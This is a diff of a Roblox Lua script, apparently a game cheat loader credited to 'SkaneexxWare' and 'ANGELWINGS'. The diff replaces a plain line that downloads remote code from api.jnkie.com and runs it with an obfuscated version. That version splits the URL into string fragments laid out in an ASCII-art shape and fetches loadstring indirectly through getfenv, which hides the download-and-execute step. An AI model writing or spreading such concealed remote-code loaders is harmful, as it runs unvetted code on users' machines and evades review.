@@ -1,3 +1,5 @@
+SCRIPT_KEY="KEYLESS"
+
 --[[
           #+##########                                                                               
          #+-#############                                                                            
@@ -90,5 +92,25 @@ d88P     888 888    Y888  "Y8888P88 8888888888 88888888 888P     Y888 8888888 88
 Telegram: @SkaneexxWare
 Discord: discord.gg/jUuYn6gRjk
 ]]--
-SCRIPT_KEY="KEYLESS"
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/150bf6bb445d25747ea081f17accc395e65f11843c2bcdb91468b5efd296ac10/download"))()
+                         a='h'                                       
+                        b='ttp'                                      
+                       c='s://a'                                     
+                      d='pi.jnkie'                                    
+                     e='.com/api/v'                                   
+                    f='1/luascripts'                                  
+                   g='/public/150bf6'                               
+                  h='bb445d25747ea081f'                              
+                 i='17accc395e65f11843c'                                         
+                j='2bcdb91468b5efd296ac1';  
+	     n='0/download';          --=                      
+              k=a..b..c..d..e..f..g..h;  --=  
+	   m=i..j..n;		  --= 
+            local x=[[game:Htt]];          --=                           
+           local y=[[pGet("]]..k..m;        --=                          
+          local z=[[")]];local fun;         --[]=                         
+         fun=getfenv()local load;      --[[]]--[]=                       
+        load=fun['loadstring'];local src;       --=                      
+       src=load('return'..' '..x..y..z);         --=                      
+      load(src())();--      --   ink game loader  --=     
+
+               -- Made by ANGELWINGS --
